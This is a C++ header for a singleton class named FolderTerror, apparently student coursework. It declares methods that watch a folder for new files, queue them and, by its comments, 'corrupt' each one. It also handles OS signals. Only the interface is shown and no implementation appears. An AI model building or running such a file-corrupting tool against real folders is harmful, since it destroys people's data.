#include <filesystem>
#include <stdexcept>
#include <csignal>
#include <fstream>
#include <thread>
#include <string>
#include <queue>
#include <mutex>
#include <iostream>

namespace BMSTU {
    static bool is_work_ = true;

    class FolderTerror {
    public:
        FolderTerror(const FolderTerror &) = delete;

        FolderTerror &operator=(const FolderTerror &) = delete;

        static FolderTerror &getInstance(const std::filesystem::path &folder_path = "");

        //Function that start terror
        void startTerror();

        //Function that contain signal from OS
        static void signalProcessing();

        static int checkTerFiles(const std::filesystem::path &folder_path);

    private:
        std::queue<std::filesystem::path> terror_wait_files_;
        std::filesystem::path folder_path_;
        std::mutex mtx_;

        explicit FolderTerror(const std::filesystem::path &folder_path = "");

        //Function that watches for new files in a folder
        void lurking();

        //Function that checking queue and calls the terrorist function if it is not empty
        void isPossibleToTerror();

        //Function that corrupts the file
        void terrorFile(const std::filesystem::path &path_to_file);

        //Function that process signal from OS
        static void processSignal(int signum);
    };
}